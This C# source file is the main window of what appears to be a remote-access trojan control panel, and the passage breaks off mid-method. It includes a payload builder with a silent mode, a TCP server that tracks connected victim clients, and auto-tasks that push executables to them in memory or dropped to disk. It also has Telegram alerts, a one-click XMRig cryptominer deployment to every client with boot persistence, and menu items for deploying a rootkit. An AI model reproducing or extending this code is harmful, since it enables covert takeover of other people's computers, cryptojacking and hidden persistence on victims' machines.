#nullable disable

using Microsoft.Win32;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.IO.Compression;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Threading;
using DiscordRPC;
using DiscordRPC.Message;
using Button = System.Windows.Controls.Button;
using WpfApp.Plugins;
using WpfApp.Plugins.Builtin;

namespace WpfApp
{
    [SupportedOSPlatform("windows")]
    public partial class MainWindow : Window
    {
        private bool _pwSyncing;
        private string _builderActualPassword = "";
        private bool _builderPwHidden = true;
        private TextBox _httpPwReveal;
        private TcpServer _tcpServer;

        // Plugin system
        private PluginHost _pluginHost;
        private PluginManager _pluginManager;
        private readonly Dictionary<string, Window> _pluginWindows = new Dictionary<string, Window>();

        // Log batching system
        private readonly ConcurrentQueue<string> _pendingLogMessages = new();
        private volatile bool _logFlushScheduled;
        private const int MaxLogLines = 500;
        private const int LogBatchSize = 50;

        // Verbose logging toggle
        private bool _verboseLogging = false;

        // Current execution mode (DropToDisk or InMemory)
        private ExecutionMode _currentExecutionMode = ExecutionMode.DropToDisk;

        // Auto Tasks system
        private readonly ObservableCollection<AutoTaskItem> _autoTasks = new ObservableCollection<AutoTaskItem>();
        private readonly ConcurrentDictionary<string, List<string>> _taskExecutionLog = new ConcurrentDictionary<string, List<string>>();
        private readonly object _taskLogLock = new object();
        private readonly string _autoTasksFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "auto_tasks.json");

        // Settings persistence
        private readonly string _settingsFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "server_settings.json");

        // Telegram notification
        private static readonly HttpClient _httpClient = new();
        private string _telegramBotToken = "";
        private string _telegramChatId = "";
        private bool _telegramNotify;

        // Discord Rich Presence
        private DiscordRpcClient _discordClient;
        private DateTime _discordStartTime;

        // Client ID mapping: each unique rawId gets exactly ONE display ID.
        private readonly ConcurrentDictionary<string, string> _rawToDisplayId = new();
        private readonly ConcurrentDictionary<string, string> _displayToRawId = new();

        // Tracks display IDs per base name with incrementing counter
        private readonly object _idAssignmentLock = new object();

        // Tracks which display IDs have already had auto tasks executed
        private readonly ConcurrentDictionary<string, bool> _autoTasksExecutedFor = new();

        // Grace period before removing a disconnected client from UI
        private readonly ConcurrentDictionary<string, DateTime> _disconnectGracePeriod = new();
        private static readonly TimeSpan DisconnectGrace = TimeSpan.Zero;
        private static readonly TimeSpan ClientTimeout = TimeSpan.FromSeconds(120);

        // When true, all incoming client registrations and disconnections are ignored
        private volatile bool _serverStopping;

        // Stores the client info for each display ID
        private readonly ConcurrentDictionary<string, ClientInfoData> _displayIdClientInfo = new();

        // Serializes all UI mutations for client list to prevent interleaving
        private readonly object _clientUiLock = new object();

        // Cached template-named elements
        private TextBox _searchTextBox;

        private readonly ObservableCollection<ClientItem> _clientItems = new();
        private DispatcherTimer _clientCheckTimer;
        private readonly ConcurrentDictionary<string, DateTime> _clientLastSeen = new();
        private X509Certificate2 _serverCertificate;
        private bool _isListening;
        private int _currentPort;
        private string _selectedFilePath;

        public ObservableCollection<ClientItem> ClientItems => _clientItems;
        public ObservableCollection<AutoTaskItem> AutoTasks => _autoTasks;
        public PluginHost PluginHost => _pluginHost;

        // ==================== EXECUTION MODE ENUM ====================

        public enum ExecutionMode
        {
            DropToDisk,
            InMemory
        }

        // ==================== CONSTRUCTOR ====================

        public MainWindow()
        {
            InitializeComponent();
            clientList.ItemsSource = ClientItems;
            autoTasksList.ItemsSource = AutoTasks;

            _clientCheckTimer = new DispatcherTimer
            {
                Interval = TimeSpan.FromSeconds(5)
            };
            _clientCheckTimer.Tick += ClientCheckTimer_Tick;
            _clientCheckTimer.Start();

            builderPortTextBox.Text = "443";

            LoadSettings();
            LoadAutoTasks();

            _pluginHost = new PluginHost(this);
            _pluginManager = new PluginManager(this, _pluginHost);

            builderPasswordBox.TextChanged += (s, e) => SyncPwToServer();
            HttpPasswordBox.PasswordChanged += (s, e) => SyncPwToBuilder();
            SetupBuilderPasswordBox();
            SetupPasswordReveal(HttpPasswordBox, ref _httpPwReveal, "httpPwReveal");

            AddAutoTaskRootkitMenuItems();
        }

        void SyncPwToServer()
        {
            if (_pwSyncing) return;
            _pwSyncing = true;
            HttpPasswordBox.Password = _builderActualPassword;
            _pwSyncing = false;
        }

        void SyncPwToBuilder()
        {
            if (_pwSyncing) return;
            _pwSyncing = true;
            _builderActualPassword = HttpPasswordBox.Password;
            if (_builderPwHidden)
                builderPasswordBox.Text = new string('●', _builderActualPassword.Length);
            else
                builderPasswordBox.Text = _builderActualPassword;
            _pwSyncing = false;
        }

        void SetupPasswordReveal(PasswordBox pwBox, ref TextBox revealRef, string name)
        {
            var parent = (Grid)pwBox.Parent;
            int col = Grid.GetColumn(pwBox);

            var txtBox = new TextBox
            {
                Name = name,
                Text = pwBox.Password,
                Padding = pwBox.Padding,
                FontSize = pwBox.FontSize,
                MinHeight = pwBox.MinHeight,
                VerticalContentAlignment = pwBox.VerticalContentAlignment,
                HorizontalAlignment = pwBox.HorizontalAlignment,
                Visibility = Visibility.Collapsed,
                BorderThickness = new Thickness(1),
                Background = pwBox.Background,
                Foreground = pwBox.Foreground,
                BorderBrush = pwBox.BorderBrush,
                CaretBrush = pwBox.Foreground,
                Style = null
            };
            revealRef = txtBox;
            Grid.SetColumn(txtBox, col);
            parent.Children.Add(txtBox);

            pwBox.PasswordChanged += (s, e) => txtBox.Text = pwBox.Password;
            txtBox.TextChanged += (s, e) => pwBox.Password = txtBox.Text;

            var brdrBrush = (SolidColorBrush)Application.Current.Resources["BorderBrush"];
            var txtDimBrush = (SolidColorBrush)Application.Current.Resources["TextSecondaryBrush"];
            var sfLightBrush = (SolidColorBrush)Application.Current.Resources["SurfaceLightBrush"];

            var eyeBtnBorder = new Border
            {
                Width = 36,
                Height = 36,
                CornerRadius = new CornerRadius(6),
                Background = Brushes.Transparent,
                BorderBrush = brdrBrush,
                BorderThickness = new Thickness(1),
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(6, 0, 0, 0)
            };

            var eyeBtn = new System.Windows.Controls.Primitives.ToggleButton
            {
                Content = "👁",
                VerticalAlignment = VerticalAlignment.Center,
                HorizontalAlignment = HorizontalAlignment.Center,
                IsChecked = false,
                Background = Brushes.Transparent,
                BorderThickness = new Thickness(0),
                Cursor = Cursors.Hand,
                ToolTip = "Show/hide password",
                Foreground = txtDimBrush
            };

            eyeBtnBorder.Child = eyeBtn;

            eyeBtn.Checked += (s, e) => { pwBox.Visibility = Visibility.Collapsed; txtBox.Visibility = Visibility.Visible; };
            eyeBtn.Unchecked += (s, e) => { txtBox.Visibility = Visibility.Collapsed; pwBox.Visibility = Visibility.Visible; };
            eyeBtn.MouseEnter += (s, e) => { eyeBtnBorder.Background = sfLightBrush; eyeBtnBorder.BorderBrush = txtDimBrush; };
            eyeBtn.MouseLeave += (s, e) => { eyeBtnBorder.Background = Brushes.Transparent; eyeBtnBorder.BorderBrush = brdrBrush; };

            Grid.SetColumn(eyeBtnBorder, col + 1);
            parent.Children.Add(eyeBtnBorder);
        }

        void SetupBuilderPasswordBox()
        {
            _builderPwHidden = true;
            _builderActualPassword = "";

            builderPasswordBox.PreviewTextInput += BuilderPw_PreviewTextInput;
            builderPasswordBox.PreviewKeyDown += BuilderPw_PreviewKeyDown;
            DataObject.AddPastingHandler(builderPasswordBox, BuilderPw_Paste);

            var parent = (Grid)builderPasswordBox.Parent;
            int col = Grid.GetColumn(builderPasswordBox);

            var brdrBrush = (SolidColorBrush)Application.Current.Resources["BorderBrush"];
            var txtDimBrush = (SolidColorBrush)Application.Current.Resources["TextSecondaryBrush"];
            var sfLightBrush = (SolidColorBrush)Application.Current.Resources["SurfaceLightBrush"];

            var eyeBtnBorder = new Border
            {
                Width = 36,
                Height = 36,
                CornerRadius = new CornerRadius(6),
                Background = Brushes.Transparent,
                BorderBrush = brdrBrush,
                BorderThickness = new Thickness(1),
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(6, 0, 0, 0)
            };

            var eyeBtn = new System.Windows.Controls.Primitives.ToggleButton
            {
                Content = "👁",
                VerticalAlignment = VerticalAlignment.Center,
                HorizontalAlignment = HorizontalAlignment.Center,
                IsChecked = false,
                Background = Brushes.Transparent,
                BorderThickness = new Thickness(0),
                Cursor = Cursors.Hand,
                ToolTip = "Show/hide password",
                Foreground = txtDimBrush
            };

            eyeBtnBorder.Child = eyeBtn;

            eyeBtn.Checked += (s, e) =>
            {
                _builderPwHidden = false;
                builderPasswordBox.Text = _builderActualPassword;
            };
            eyeBtn.Unchecked += (s, e) =>
            {
                _builderPwHidden = true;
                builderPasswordBox.Text = new string('●', _builderActualPassword.Length);
            };
            eyeBtn.MouseEnter += (s, e) => { eyeBtnBorder.Background = sfLightBrush; eyeBtnBorder.BorderBrush = txtDimBrush; };
            eyeBtn.MouseLeave += (s, e) => { eyeBtnBorder.Background = Brushes.Transparent; eyeBtnBorder.BorderBrush = brdrBrush; };

            Grid.SetColumn(eyeBtnBorder, col + 1);
            parent.Children.Add(eyeBtnBorder);

            builderPasswordBox.Text = new string('●', _builderActualPassword.Length);
        }

        void BuilderPw_PreviewTextInput(object sender, TextCompositionEventArgs e)
        {
            if (!_builderPwHidden) return;
            var tb = (TextBox)sender;
            int start = tb.SelectionStart;
            int selLen = tb.SelectionLength;
            _builderActualPassword = _builderActualPassword.Remove(start, selLen).Insert(start, e.Text);
            tb.Text = new string('●', _builderActualPassword.Length);
            tb.CaretIndex = start + e.Text.Length;
            e.Handled = true;
        }

        void BuilderPw_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            if (!_builderPwHidden) return;
            var tb = (TextBox)sender;
            int start = tb.SelectionStart;
            int selLen = tb.SelectionLength;
            if (e.Key == Key.Back)
            {
                if (selLen > 0)
                {
                    _builderActualPassword = _builderActualPassword.Remove(start, selLen);
                    tb.Text = new string('●', _builderActualPassword.Length);
                    tb.CaretIndex = start;
                }
                else if (start > 0)
                {
                    _builderActualPassword = _builderActualPassword.Remove(start - 1, 1);
                    tb.Text = new string('●', _builderActualPassword.Length);
                    tb.CaretIndex = start - 1;
                }
                e.Handled = true;
            }
            else if (e.Key == Key.Delete)
            {
                if (selLen > 0)
                {
                    _builderActualPassword = _builderActualPassword.Remove(start, selLen);
                    tb.Text = new string('●', _builderActualPassword.Length);
                    tb.CaretIndex = start;
                }
                else if (start < _builderActualPassword.Length)
                {
                    _builderActualPassword = _builderActualPassword.Remove(start, 1);
                    tb.Text = new string('●', _builderActualPassword.Length);
                    tb.CaretIndex = start;
                }
                e.Handled = true;
            }
        }

        void BuilderPw_Paste(object sender, DataObjectPastingEventArgs e)
        {
            if (!_builderPwHidden) return;
            if (e.DataObject.GetDataPresent(DataFormats.Text))
            {
                var tb = (TextBox)sender;
                string text = (string)e.DataObject.GetData(DataFormats.Text);
                int start = tb.SelectionStart;
                int selLen = tb.SelectionLength;
                _builderActualPassword = _builderActualPassword.Remove(start, selLen).Insert(start, text);
                tb.Text = new string('●', _builderActualPassword.Length);
                tb.CaretIndex = start + text.Length;
            }
            e.Handled = true;
        }

        // ==================== LOG LEVELS ====================

        public void AppendVerboseLog(string message)
        {
            if (_verboseLogging)
                AppendLog(message);
        }

        // ==================== SETTINGS PERSISTENCE ====================

        private void LoadSettings()
        {
            bool found = false;
            try
            {
                if (File.Exists(_settingsFilePath))
                {
                    string json = File.ReadAllText(_settingsFilePath);
                    var settings = JsonSerializer.Deserialize<ServerSettings>(json);

                    if (settings != null)
                    {
                        found = true;

                        Dispatcher.Invoke(() =>
                        {
                            if (!string.IsNullOrWhiteSpace(settings.EncryptionKey))
                                builderEncryptionKeyTextBox.Text = settings.EncryptionKey;

                            if (!string.IsNullOrWhiteSpace(settings.Port))
                                builderPortTextBox.Text = settings.Port;

                            if (!string.IsNullOrWhiteSpace(settings.ServerIp))
                                builderIpTextBox.Text = settings.ServerIp;

                    if (!string.IsNullOrWhiteSpace(settings.Password))
                        _builderActualPassword = settings.Password;

                    builderSilentCheckBox.IsChecked = settings.SilentMode;

                    if (!string.IsNullOrWhiteSpace(settings.ListenPort))
                                listenportTextBox.Text = settings.ListenPort;

                            if (!string.IsNullOrWhiteSpace(settings.ServerPassword))
                                HttpPasswordBox.Password = settings.ServerPassword;
                        });

                        AppendLog("Loaded saved encryption key and settings.");
                    }

                    if (settings != null && !string.IsNullOrWhiteSpace(settings.Theme)
                        && ThemeManager.Themes.ContainsKey(settings.Theme))
                    {
                        ThemeManager.ApplyTheme(settings.Theme);
                    }

            if (settings != null)
            {
                Dispatcher.Invoke(() =>
                {
                    chkAutoListen.IsChecked = settings.AutoListen;
                    chkShowPopup.IsChecked = settings.ShowPopup;
                    chkTelegramNotify.IsChecked = settings.TelegramNotify;
                    telegramTokenBox.Password = settings.TelegramBotToken ?? "";
                    telegramChatIdBox.Text = settings.TelegramChatId ?? "";
                    chkDiscordRpc.IsChecked = settings.DiscordRpcEnabled;
                });

                _telegramBotToken = settings.TelegramBotToken ?? "";
                _telegramChatId = settings.TelegramChatId ?? "";
                _telegramNotify = settings.TelegramNotify;
            }
                }
            }
            catch (Exception ex)
            {
                AppendLog($"Could not load settings: {ex.Message}");
            }

            if (!found)
            {
                AppendLog("No saved settings found. Using defaults.");
            }
        }

        private void SaveSettings()
        {
            try
            {
                var settings = new ServerSettings();

                Dispatcher.Invoke(() =>
                {
                    settings.EncryptionKey = builderEncryptionKeyTextBox.Text;
                    settings.Port = builderPortTextBox.Text;
                    settings.ServerIp = builderIpTextBox.Text;
                    settings.Password = _builderActualPassword;
                    settings.ListenPort = listenportTextBox.Text;
                    settings.ServerPassword = HttpPasswordBox.Password;
                    settings.Theme = ThemeManager.CurrentTheme;
                    settings.AutoListen = chkAutoListen.IsChecked == true;
                    settings.ShowPopup = chkShowPopup.IsChecked == true;
                    settings.TelegramNotify = chkTelegramNotify.IsChecked == true;
                    settings.TelegramBotToken = telegramTokenBox.Password;
                    settings.TelegramChatId = telegramChatIdBox.Text;
                    settings.DiscordRpcEnabled = chkDiscordRpc.IsChecked == true;
                    settings.SilentMode = builderSilentCheckBox.IsChecked == true;
                });

                string json = JsonSerializer.Serialize(settings, new JsonSerializerOptions
                {
                    WriteIndented = true
                });

                File.WriteAllText(_settingsFilePath, json);
            }
            catch (Exception ex)
            {
                AppendLog($"Could not save settings: {ex.Message}");
            }
        }

        private class ServerSettings
        {
            public string EncryptionKey { get; set; }
            public string Port { get; set; }
            public string ServerIp { get; set; }
            public string Password { get; set; }
            public string ListenPort { get; set; }
            public string ServerPassword { get; set; }
            public string Theme { get; set; }
            public bool AutoListen { get; set; }
            public bool ShowPopup { get; set; }
            public string TelegramBotToken { get; set; }
            public string TelegramChatId { get; set; }
            public bool TelegramNotify { get; set; }
            public bool DiscordRpcEnabled { get; set; }
            public bool SilentMode { get; set; }
        }

        private class ThemeCardItem
        {
            public string Name { get; set; }
            public string DisplayName { get; set; }
            public string Description { get; set; }
            public bool IsActive { get; set; }
            public SolidColorBrush PrimaryBrush { get; set; }
            public SolidColorBrush SurfaceBrush { get; set; }
            public SolidColorBrush BackgroundBrush { get; set; }
            public SolidColorBrush BorderBrush { get; set; }
        }

        // ==================== AUTO TASKS ====================

        private void LoadAutoTasks()
        {
            try
            {
                if (File.Exists(_autoTasksFilePath))
                {
                    string json = File.ReadAllText(_autoTasksFilePath);
                    var tasks = JsonSerializer.Deserialize<List<AutoTaskData>>(json);

                    if (tasks != null)
                    {
                        Dispatcher.Invoke(() =>
                        {
                            _autoTasks.Clear();
                            foreach (var task in tasks)
                            {
                                _autoTasks.Add(new AutoTaskItem(
                                    task.Id,
                                    task.Name,
                                    task.FilePath,
                                    task.IsEnabled,
                                    task.RunCount,
                                    task.LastRun,
                                    task.LastClient,
                                    task.UseInMemory,
                                    (AutoTaskAction)task.ActionType,
                                    task.Pool ?? "pool.supportxmr.com:3333",
                                    task.Wallet ?? "",
                                    task.Worker ?? "",
                                    task.ThreadCount,
                                    task.RootkitProcessName
                                ));

                                _taskExecutionLog.TryAdd(task.Id, new List<string>());
                            }
                        });

                        AppendLog($"Loaded {tasks.Count} auto task(s).");
                    }
                }
            }
            catch (Exception ex)
            {
                AppendLog($"Could not load auto tasks: {ex.Message}");
            }

            UpdateAutoTaskCount();
        }

        private void SaveAutoTasks()
        {
            try
            {
                var tasks = new List<AutoTaskData>();

                Dispatcher.Invoke(() =>
                {
                    foreach (var task in _autoTasks)
                    {
                        tasks.Add(new AutoTaskData
                        {
                            Id = task.Id,
                            Name = task.Name,
                            FilePath = task.FilePath,
                            IsEnabled = task.IsEnabled,
                            RunCount = task.RunCount,
                            LastRun = task.LastRun,
                            LastClient = task.LastClient,
                            UseInMemory = task.UseInMemory,
                            ActionType = (int)task.ActionType,
                            Pool = task.Pool,
                            Wallet = task.Wallet,
                            Worker = task.Worker,
                            ThreadCount = task.ThreadCount,
                            RootkitProcessName = task.RootkitProcessName
                        });
                    }
                });

                string json = JsonSerializer.Serialize(tasks, new JsonSerializerOptions
                {
                    WriteIndented = true
                });

                File.WriteAllText(_autoTasksFilePath, json);
            }
            catch (Exception ex)
            {
                AppendLog($"Could not save auto tasks: {ex.Message}");
            }
        }

        private void AddAutoTaskButton_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "Executable Files (*.exe;*.bat;*.dll;*.ps1)|*.exe;*.bat;*.dll;*.ps1|All Files (*.*)|*.*",
                Title = "Select Executable or Batch File"
            };

            if (dialog.ShowDialog() == true)
            {
                string filePath = dialog.FileName;
                string fileName = Path.GetFileName(filePath);

                if (_autoTasks.Any(t => t.FilePath.Equals(filePath, StringComparison.OrdinalIgnoreCase)))
                {
                    AppendLog($"Auto task for '{fileName}' already exists.");
                    return;
                }

                var modeResult = MessageBox.Show(
                    $"How should '{fileName}' be executed on clients?\n\n" +
                    "YES = In-Memory (no file dropped to disk)\n" +
                    "NO = Drop to Disk (traditional file write + execute)\n" +
                    "CANCEL = Cancel adding task",
                    "Execution Mode",
                    MessageBoxButton.YesNoCancel,
                    MessageBoxImage.Question);

                if (modeResult == MessageBoxResult.Cancel)
                    return;

                bool useInMemory = modeResult == MessageBoxResult.Yes;

                if (useInMemory)
                {
                    string ext = Path.GetExtension(filePath).ToLowerInvariant();
                    if (ext != ".exe" && ext != ".dll")
                        AppendLog($"WARNING: In-memory execution works best with .exe/.dll files. '{ext}' may not work.");
                }

                var task = new AutoTaskItem(
                    Guid.NewGuid().ToString(),
                    fileName,
                    filePath,
                    true,
                    0,
                    null,
                    null,
                    useInMemory
                );

                _autoTasks.Add(task);
                _taskExecutionLog.TryAdd(task.Id, new List<string>());

                SaveAutoTasks();
                UpdateAutoTaskCount();
                string modeStr = useInMemory ? "in-memory" : "drop-to-disk";
                AppendLog($"Added auto task: {fileName} (mode: {modeStr})");
            }
        }

        private void CtxAutoExecMode_Click(object sender, RoutedEventArgs e)
        {
            ToggleAutoTaskModeButton_Click(sender, e);
        }

        private void EditAutoTaskMinerConfig_Click(object sender, RoutedEventArgs e)
        {
            var selectedTask = _autoTasks.FirstOrDefault(t => t.IsSelected);
            if (selectedTask == null || selectedTask.ActionType != AutoTaskAction.StartMiner)
            {
                AppendLog("Select a Start Miner auto task to edit.");
                return;
            }

            var win = ShowMinerDeployDialog(selectedTask.Pool, selectedTask.Wallet, selectedTask.Worker, selectedTask.ThreadCount, true, selectedTask);
            win.ShowDialog();
        }

        private async void StartMinerOnClients_Click(object sender, RoutedEventArgs e)
        {
            var win = ShowMinerDeployDialog("pool.supportxmr.com:3333", "", Environment.MachineName, 50, false, null);
            win.ShowDialog();
        }

        private Window ShowMinerDeployDialog(string defaultPool, string defaultWallet, string defaultWorker,
            int defaultThreads, bool editMode, AutoTaskItem existingTask)
        {
            var bgColor = (Color)Application.Current.Resources["BackgroundColor"];
            var surfColor = (Color)Application.Current.Resources["SurfaceColor"];
            var surfLight = (Color)Application.Current.Resources["SurfaceLightColor"];
            var txtColor = (Color)Application.Current.Resources["TextPrimaryColor"];
            var dimColor = (Color)Application.Current.Resources["TextSecondaryColor"];
            var okColor = (Color)Application.Current.Resources["SuccessColor"];
            var okHov = (Color)Application.Current.Resources["SuccessHoverColor"];
            var accColor = (Color)Application.Current.Resources["PrimaryColor"];
            var accHov = (Color)Application.Current.Resources["PrimaryHoverColor"];
            var warnColor = (Color)Application.Current.Resources["WarningColor"];
            var txtBr = new SolidColorBrush(txtColor);
            var dimBr = new SolidColorBrush(dimColor);
            var bgBr = new SolidColorBrush(bgColor);
            var sfBr = new SolidColorBrush(surfColor);
            var slBr = new SolidColorBrush(surfLight);
            var okBr = new SolidColorBrush(okColor);
            var okHb = new SolidColorBrush(okHov);
            var acBr = new SolidColorBrush(accColor);
            var acHb = new SolidColorBrush(accHov);

            var win = new Window
            {
                Title = editMode ? "Edit Miner Config" : "Start XMRig Miner on All Clients",
                Width = 520,
                Height = 520,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = this,
                ResizeMode = ResizeMode.NoResize,
                Background = bgBr,
                Foreground = txtBr
            };

            var root = new Grid();
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto }); // header
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto }); // config
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto }); // buttons
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(4) }); // progress
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) }); // log

            // Header
            var hdr = new Border { Background = sfBr, Padding = new Thickness(10) };
            hdr.Child = new TextBlock { Text = "XMRig Miner Deployment", FontSize = 14, FontWeight = FontWeights.SemiBold, Foreground = txtBr };
            Grid.SetRow(hdr, 0);
            root.Children.Add(hdr);

            // Config grid
            var cfgGrid = new Grid { Margin = new Thickness(10), Background = sfBr };
            cfgGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            cfgGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            cfgGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfgGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfgGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfgGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfgGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfgGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            int r = 0;
            var poolBox = AddRow(cfgGrid, r++, "Pool:", defaultPool, txtBr, dimBr, bgBr);
            var walletBox = AddRow(cfgGrid, r++, "Wallet:", defaultWallet, txtBr, dimBr, bgBr);
            var workerBox = AddRow(cfgGrid, r++, "Worker:", defaultWorker, txtBr, dimBr, bgBr);

            var cp = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 4, 0, 4) };
            cp.Children.Add(new TextBlock { Text = "CPU:", Foreground = dimBr, FontSize = 12, VerticalAlignment = VerticalAlignment.Center });
            var cpuSlider = new Slider { Width = 100, Minimum = 1, Maximum = 100, Value = defaultThreads, TickFrequency = 5, IsSnapToTickEnabled = true, Margin = new Thickness(6, 0, 4, 0), VerticalAlignment = VerticalAlignment.Center };
            var cpuLabel = new TextBlock { Text = (int)cpuSlider.Value + "%", Foreground = txtBr, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, MinWidth = 36 };
            cpuSlider.ValueChanged += (s, ev) => cpuLabel.Text = (int)cpuSlider.Value + "%";
            cp.Children.Add(cpuSlider);
            cp.Children.Add(cpuLabel);
            Grid.SetRow(cp, r); Grid.SetColumnSpan(cp, 2);
            cfgGrid.Children.Add(cp);
            r++;

            var autoStartChk = new CheckBox { Content = "Auto-start on boot", Foreground = dimBr, FontSize = 12, Margin = new Thickness(0, 4, 0, 4) };
            Grid.SetRow(autoStartChk, r); Grid.SetColumnSpan(autoStartChk, 2);
            cfgGrid.Children.Add(autoStartChk);
            r++;

            Grid.SetRow(cfgGrid, 1);
            root.Children.Add(cfgGrid);

            // Button bar
            var bb = new Border { Background = slBr, Padding = new Thickness(10, 6, 10, 6) };
            var bp = new StackPanel { Orientation = Orientation.Horizontal };
            var buildBtn = MakeMiniBtn("Build & Send", okBr, okHb, Brushes.White);
            var closeBtn = MakeMiniBtn("Close", acBr, acHb, Brushes.White);
            var statusText = new TextBlock { Text = editMode ? "Edit then close" : "Ready", Foreground = dimBr, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 0, 0) };
            bp.Children.Add(buildBtn);
            bp.Children.Add(closeBtn);
            bp.Children.Add(statusText);
            bb.Child = bp;
            Grid.SetRow(bb, 2);
            root.Children.Add(bb);

            // Progress bar
            var progress = new ProgressBar { Height = 4, Minimum = 0, Maximum = 100, Value = 0, Visibility = Visibility.Collapsed, Foreground = acBr };
            Grid.SetRow(progress, 3);
            root.Children.Add(progress);

            // Log box
            var logBox = new TextBox
            {
                Background = bgBr, Foreground = new SolidColorBrush(Color.FromRgb(100, 220, 100)),
                BorderThickness = new Thickness(0), FontFamily = new FontFamily("Consolas"),
                FontSize = 11, IsReadOnly = true, TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto, Padding = new Thickness(4),
                CaretBrush = Brushes.Transparent, AcceptsReturn = true, Style = null,
                Margin = new Thickness(0, 0, 0, 0)
            };
            Grid.SetRow(logBox, 4);
            root.Children.Add(logBox);

            win.Content = root;

            void Log(string msg)
            {
                string line = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + msg + "\n";
                logBox.AppendText(line);
                logBox.ScrollToEnd();
            }

            bool busy = false;
            buildBtn.Click += async (s, ev) =>
            {
                if (busy) return;
                string wallet = walletBox.Text.Trim();
                if (string.IsNullOrEmpty(wallet))
                {
                    Log("Enter a wallet address first.");
                    return;
                }
                busy = true;
                buildBtn.IsEnabled = false;
                progress.Visibility = Visibility.Visible;
                progress.Value = 0;
                statusText.Text = "Deploying...";
                Log("Starting deployment to all connected clients...");

                try
                {
                    if (!_pluginHost.LoadedPlugins.TryGetValue("miner", out var plugin) || !(plugin is WpfApp.Plugins.Builtin.MinerPlugin mp))
                    {
                        Log("Miner plugin not loaded.");
                        return;
                    }

                    string pool = poolBox.Text.Trim();
                    string worker = workerBox.Text.Trim();
                    int cpuPct = (int)cpuSlider.Value;
                    bool autoStart = autoStartChk.IsChecked == true;

                    progress.Value = 10;

                    string rawId = null;
                    int deployCount = 0;
                    int failCount = 0;

                    // Deploy to all currently connected clients
                    if (_tcpServer != null)
                    {
                        var connected = _tcpServer.GetConnectedClientIds();
                        int total = connected.Count();
                        Log($"Found {total} connected client(s).");
                        foreach (var cid in connected)
                        {
                            rawId = cid;
                            Log($"Deploying to {rawId}...");
                            try
                            {
                                bool ok = await mp.DeployAndStartForClient(rawId, pool, wallet, worker, cpuPct, autoStart);
                                if (ok)
                                {
                                    deployCount++;
                                    Log($"Deployed to {rawId}");
                                }
                                else
                                {
                                    failCount++;
                                    Log($"Failed to deploy to {rawId}");
                                }
                            }
                            catch (Exception ex)
                            {
                                failCount++;
                                Log($"Error deploying to {rawId}: {ex.Message}");
                            }
                            progress.Value = 10 + (int)(80.0 * (deployCount + failCount) / total);
                        }
                    }

                    progress.Value = 95;

                    // Create or update AutoTaskItem for future clients
                    AutoTaskItem task;
                    if (editMode && existingTask != null)
                    {
                        task = existingTask;
                        task.Pool = pool;
                        task.Wallet = wallet;
                        task.Worker = worker;
                        task.ThreadCount = cpuPct;
                    }
                    else
                    {
                        task = new AutoTaskItem(
                            Guid.NewGuid().ToString(),
                            "XMRig Miner",
                            "",
                            true,
                            0,
                            null,
                            null,
                            false,
                            AutoTaskAction.StartMiner,
                            pool, wallet, worker, cpuPct
                        );
                        _autoTasks.Add(task);
                        _taskExecutionLog.TryAdd(task.Id, new List<string>());
                    }

                    // Log execution for each connected client
                    string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Deployed to {deployCount} client(s) (pool: {pool})";
                    _taskExecutionLog.AddOrUpdate(
                        task.Id,
                        _ => new List<string> { logEntry },
                        (_, list) =>
                        {
                            lock (_taskLogLock)
                            {
                                list.Add(logEntry);
                                if (list.Count > 100)
                                    list.RemoveAt(0);
                            }
                            return list;
                        });

                    SaveAutoTasks();
                    UpdateAutoTaskCount();

                    progress.Value = 100;
                    statusText.Text = $"Deployed to {deployCount} client(s)";
                    Log($"Done. {deployCount} succeeded, {failCount} failed.");
                    AppendLog($"Auto task: Deployed XMRig Miner to {deployCount} client(s) (wallet: {wallet})");
                }
                catch (Exception ex)
                {
                    Log("Error: " + ex.Message);
                    statusText.Text = "Failed";
                }
                finally
                {
                    busy = false;
                    buildBtn.IsEnabled = true;
                    await Task.Delay(2000);
                    progress.Visibility = Visibility.Collapsed;
                }
            };

            closeBtn.Click += (s, ev) => win.Close();

            return win;
        }

        private void AddAutoTaskRootkitMenuItems()
        {
            var ctx = autoTasksList.ContextMenu;
            if (ctx == null) return;

            var deployItem = new MenuItem
            {
                Header = "🔒  Deploy $tp Rootkit to Clients",
                ToolTip = "Deploy $tp rootkit to all connected clients and create auto task"
            };
            deployItem.Click += DeployRootkitOnClients_Click;

            var editItem = new MenuItem
            {
                Header = "Edit Rootkit Config (selected)",
